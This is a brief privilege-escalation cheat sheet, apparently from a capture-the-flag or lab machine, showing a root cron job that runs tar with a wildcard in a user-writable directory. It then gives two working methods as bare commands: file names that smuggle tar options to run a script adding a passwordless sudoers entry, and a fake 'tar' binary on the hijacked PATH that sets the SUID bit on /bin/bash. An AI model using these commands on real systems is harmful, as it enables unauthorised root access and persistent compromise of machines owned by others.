
## Tar Wildcard Injection

```bash
$ cat /etc/crontab
*/1 * * * * root /usr/local/bin/backup-flask.sh

$ cat /usr/local/bin/backup-flask.sh
#!/bin/sh
export PATH="/home/alfredo/restapi:$PATH"
cd /home/alfredo/restapi
tar czf /tmp/flask.tar.gz *
```

```bash
# first method
echo "" > '--checkpoint=1'
echo "" > '--checkpoint-action=exec=sh privesc.sh'
echo "echo 'alfredo ALL=(root) NOPASSWD: ALL' >> /etc/sudoers" > privesc.sh
#second method
echo '#!/bin/bash' > tar
echo 'chmod u+s /bin/bash' >> tar
chmod +x tar
find / -user root -perm -u=s -ls 2>/dev/null
```
